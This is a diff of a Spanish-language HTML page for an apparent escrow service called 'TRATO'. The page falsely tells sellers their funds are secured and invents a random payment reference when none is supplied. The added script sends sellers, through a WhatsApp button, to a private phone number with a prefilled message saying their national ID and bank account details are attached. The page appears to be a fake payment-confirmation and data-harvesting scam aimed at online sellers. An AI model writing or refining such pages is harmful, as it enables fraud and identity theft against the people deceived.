@@ -48,10 +48,11 @@
             background: #f0f2f5;
             padding: 8px;
             font-family: monospace;
-            font-size: 12px;
+            font-size: 14px;
             border-radius: 4px;
-            color: #606770;
+            color: #1c1e21;
             margin-bottom: 20px;
+            font-weight: bold;
         }
 
         .trust-message {
@@ -65,25 +66,33 @@
             margin-bottom: 25px;
         }
 
-        .qr-placeholder {
-            border: 2px dashed #ddd;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-radius: 8px;
-        }
-
-        .btn-finalizar {
-            background: var(--fb-blue);
+        /* ESTILO PARA EL NUEVO BOTÓN DE WHATSAPP */
+        .btn-whatsapp {
+            background: #25D366;
             color: white;
             text-decoration: none;
-            padding: 14px 20px;
-            border-radius: 8px;
+            padding: 18px 20px;
+            border-radius: 10px;
             display: block;
             font-weight: bold;
+            font-size: 16px;
+            box-shadow: 0 4px 10px rgba(37, 211, 102, 0.3);
             transition: 0.2s;
+            margin-bottom: 15px;
         }
 
-        .btn-finalizar:hover { background: #166fe5; }
+        .btn-whatsapp:hover {
+            background: #1eb954;
+            transform: translateY(-2px);
+        }
+
+        .btn-volver {
+            color: var(--fb-gray);
+            text-decoration: none;
+            font-size: 13px;
+            display: inline-block;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
@@ -92,26 +101,50 @@
     <div class="icon-shield">🛡️</div>
     <div class="status-title">FONDOS ASEGURADOS</div>
     
-    <div class="transaction-id">REF: TR-994206-MP</div>
+    <div class="transaction-id" id="id-pago">REF: CARGANDO...</div>
 
     <div class="trust-message">
         <strong>Confirmación del Sistema:</strong><br>
         El pago ha sido procesado correctamente y se encuentra bajo el <strong>Protocolo de Custodia de TRATO</strong>.<br><br>
-        El dinero será liberado al vendedor únicamente cuando escanees el código de entrega.
+        <strong>Vendedor:</strong> Al entregar el producto, presiona el botón de abajo para solicitar tu dinero.
     </div>
 
-    <div class="qr-placeholder">
-        <p style="font-size: 12px; color: #606770;">CÓDIGO DE LIBERACIÓN</p>
-        <div style="font-size: 40px;">📱 [QR]</div>
-        <p style="font-size: 11px; margin-top: 5px; color: #999;">Muestra este código solo al recibir el producto.</p>
-    </div>
+    <div id="contenedor-boton"></div>
 
-    <a href="/" class="btn-finalizar">Ir a mis TRATOS</a>
+    <a href="/" class="btn-volver">Ir al inicio</a>
 
-    <p style="font-size: 11px; color: #bcc0c4; margin-top: 20px;">
+    <p style="font-size: 11px; color: #bcc0c4; margin-top: 25px;">
         Operación garantizada por la infraestructura de RICHARD BRO.
     </p>
 </div>
+
+<script>
+    // 1. Capturamos los datos que nos manda Mercado Pago en la URL
+    const params = new URLSearchParams(window.location.search);
+    const paymentId = params.get('payment_id') || "TR-" + Math.floor(Math.random() * 1000000);
+    
+    // Mostramos el ID en la tarjeta
+    document.getElementById('id-pago').innerText = "REF: " + paymentId;
+
+    // 2. Configuración del mensaje automático para RICHARD
+    const miTel = "543456528480";
+    const textoBase = `SOLICITUD DE LIBERACIÓN DE FONDOS 🛡️
+---
+ID Operación: ${paymentId}
+---
+Confirmo que el producto ha sido entregado correctamente. Solicito a TRATO la liberación de los fondos a mi cuenta.
+
+Adjunto mi DNI y CBU/CVU.`;
+
+    const linkFinal = `https://wa.me/${miTel}?text=${encodeURIComponent(textoBase)}`;
+
+    // 3. Inyectamos el botón en el HTML
+    document.getElementById('contenedor-boton').innerHTML = `
+        <a href="${linkFinal}" class="btn-whatsapp">
+            CONFIRMAR ENTREGA Y COBRAR 📱
+        </a>
+    `;
+</script>
 
 </body>
 </html>
